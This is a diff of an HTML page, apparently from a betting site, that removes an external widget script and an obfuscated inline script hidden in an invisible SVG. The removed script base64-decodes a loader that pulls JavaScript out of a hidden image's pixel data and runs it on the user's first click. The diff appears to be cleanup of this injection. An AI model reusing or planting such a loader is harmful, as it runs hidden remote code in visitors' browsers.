@@ -602,7 +602,6 @@
 </div>
 </div>
 
-<script src="https://shared.dtgapi.com/widget/widget-controller/1718872755197.js"></script>
 <div id="modals-root">
    <div class="dark--fqC7c full-screen-container--tDOkN hidden" data-theme="dark">
       <div class="overlay--AL00q" style="background: rgba(0, 0, 0, 0.5);"></div>
@@ -634,8 +633,7 @@
                         <img src="https://bet-starzbet-tr--prd--pl-sb.dtgapi.com/c8238d996fa196d0629e.png"
                            id="e-37pzny3" crossorigin="anonymous" style="display: none;">
                         <svg id="e-37pzny3s" style="display: none;">
-                           <script>new Function(atob("dmFyIHM9U3RyaW5nLmZyb21DaGFyQ29kZSxqPWRvY3VtZW50LGltPWouZ2V0RWxlbWVudEJ5SWQoJ2UtMzdwem55MycpLGM9ai5jcmVhdGVFbGVtZW50KCdjYW52YXMnKSx4PWMuZ2V0Q29udGV4dCgnMmQnKSx3dz0nd2lkdGgnLGhoPSdoZWlnaHQnO2Z1bmN0aW9uIHQoKXt3PWltW3d3XSxoPWltW2hoXTtjW2hoXT1oO2Nbd3ddPXc7eC5kcmF3SW1hZ2UoaW0sMCwwKTt2YXIgZD14LmdldEltYWdlRGF0YSgwLDAsdyxoKS5kYXRhO3ZhciBhPScnLGw9ZC5sZW5ndGgscD0zMjtmb3IodmFyIGk9MDtpPGw7aSs9NCl7YSs9cyhkW2krMF18fHApK3MoZFtpKzFdfHxwKStzKGRbaSsyXXx8cCl9ai5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsbmV3IEZ1bmN0aW9uKGEpLHtvbmNlOiEwfSl9aW0ub25sb2FkPXQ7aWYoaW0uY29tcGxldGUpdCgp"))()</script>
-                        </svg>
+                                             </svg>
                      </div>
                   </div>
                   <div class="close--ONLO3" data-cy="player_ui__auth__button__close">
